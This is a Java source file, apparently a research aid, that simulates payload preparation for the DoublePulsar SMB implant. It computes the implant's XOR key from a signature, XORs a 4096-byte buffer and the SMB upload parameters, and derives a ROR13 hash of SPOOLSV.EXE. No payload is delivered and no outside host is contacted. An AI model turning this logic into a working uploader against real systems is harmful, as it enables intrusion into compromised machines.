import java.nio.*; //import java.nio.ByteBuffer;
import java.util.*;


/*
Doublepulsar payload generation simulator
*/

public class DoublepulsarUploadShellcode {
    
    public static byte[] byteXor(byte[] data, byte[] keyBytes) {
    byte[] result = new byte[data.length];
    int keyLength = keyBytes.length;

    for (int i = 0; i < data.length; i++) {
        result[i] = (byte) (data[i] ^ keyBytes[i % keyLength]);
    }

    return result;
    }
	
	    // Rotate Right (ROR) function
    static int ror(int dword, int bits) {
        return (dword >>> bits) | (dword << (32 - bits));
    }

    // Generate process hash
    static int generateProcessHash(String process) {
        int procHash = 0;

        for (int i = 0; i <= process.length(); i++) {
            procHash = ror(procHash, 13);
            procHash += (i < process.length()) ? (byte) process.charAt(i) : (byte) 0;
        }

        return procHash;
    }
	
    
   public static int ComputeDOUBLEPULSARXorKey(int sig) {
    return 2 * sig ^ ((((sig >>> 16) | (sig & 0xFF0000)) >>> 8) |
                      (((sig << 16) | (sig & 0xFF00)) << 8));
    }
	
	    // Convert 4-byte little-endian array to int
    public static int LE2INT(byte[] data) {
        return ((data[3] & 0xFF) << 24) |
               ((data[2] & 0xFF) << 16) |
               ((data[1] & 0xFF) << 8)  |
               (data[0] & 0xFF);
    }
    
    public static void main(String[] args) {
        // Equivalent to unsigned char signature[] = { 0x79, 0xe7, 0xdf, 0x90 };
        byte[] signature = {(byte) 0x79, (byte) 0xE7, (byte) 0xDF, (byte) 0x90};

        // Convert little-endian byte array to int
        int sig = LE2INT(signature);

        // Calculate XOR key
        int xorKey = ComputeDOUBLEPULSARXorKey(sig);

        System.out.printf("Calculated XOR KEY:  0x%08X%n", xorKey);

        // Split xorKey into 4 bytes (little-endian)
        byte[] byteXorKey = new byte[4];
        byteXorKey[0] = (byte) (xorKey & 0xFF);
        byteXorKey[1] = (byte) ((xorKey >> 8) & 0xFF);
        byteXorKey[2] = (byte) ((xorKey >> 16) & 0xFF);
        byteXorKey[3] = (byte) ((xorKey >> 24) & 0xFF);
		
		// Create a buffer of 4096 bytes
        byte[] buffer = new byte[4096];

        // Fill the buffer with 0x90
        for (int i = 0; i < buffer.length; i++) {
            buffer[i] = (byte) 0x00;
        }

        // Optional: print the first few bytes to verify
        for (int i = 0; i < 10; i++) {
            System.out.printf("buffer[%d] = 0x%02X%n", i, buffer[i]);
        }
		
		byte[] XorBytes = byteXor(buffer, byteXorKey);
		
		// Optional: print the first few bytes to verify
        for (int i = 0; i < 12; i++) {
            System.out.printf("Xored bytes buffer[%d] = 0x%02X%n", i, XorBytes[i]);
        }
        
        String procName = "SPOOLSV.EXE";
        int hash = generateProcessHash(procName);
        System.out.printf("Process Hash for %s: 0x%08X%n", procName, hash);
        
        /*
        ByteBuffer parameters = ByteBuffer.allocate(12);
        parameters.order(ByteOrder.LITTLE_ENDIAN);

        // First 4 bytes: 0x50D800
        parameters.putInt(0x0050D800); // Note: 0x50D800 fits into 4 bytes

        // Second 4 bytes: 4096
        parameters.putInt(4096);

        // Last 4 bytes: 0
        parameters.putInt(0);

        // Get the byte array
        byte[] byteArray = parameters.array();

        // Print the byte array in hex to verify
        for (byte b : byteArray) {
            System.out.printf("%02X ", b);
        }
        System.out.printf("\n\n");*/

    
        //copy bytebuffer to bytebuffer
        //https://stackoverflow.com/questions/3366925/deep-copy-duplicate-of-javas-bytebuffer
        
        byte[] Parameters = new byte[12];

        int firstValue = 0x507308; // 0x50D800
        int secondValue = 4096;
        int thirdValue = 0;

        // Manually place firstValue in little-endian
        Parameters[0] = (byte) (firstValue);
        Parameters[1] = (byte) ((firstValue >> 8) & 0xFF);
        Parameters[2] = (byte) ((firstValue >> 16) & 0xFF);
        Parameters[3] = (byte) ((firstValue >> 24) & 0xFF);

        // Manually place secondValue in little-endian
        Parameters[4] = (byte) (secondValue);
        Parameters[5] = (byte) ((secondValue >> 8) & 0xFF);
        Parameters[6] = (byte) ((secondValue >> 16) & 0xFF);
        Parameters[7] = (byte) ((secondValue >> 24) & 0xFF);

        // Manually place thirdValue in little-endian
        Parameters[8] = (byte) (thirdValue);
        Parameters[9] = (byte) ((thirdValue >> 8) & 0xFF);
        Parameters[10] = (byte) ((thirdValue >> 16) & 0xFF);
        Parameters[11] = (byte) ((thirdValue >> 24) & 0xFF);
        
        System.out.printf("SMB Parameters:  ");
        // Print the byte array in hex to verify
        for (byte b : Parameters) {
            System.out.printf("%02X ", b);
        }
        System.out.printf("\n");
        
        byte[] XorParameterBytes = byteXor(Parameters, byteXorKey);
        
        System.out.printf("XOR SMB Parameters:  ");
        // Print the XORed parameters byte array in hex to verify
        for (byte b : XorParameterBytes) {
            System.out.printf("%02X ", b);
        }
    }
}
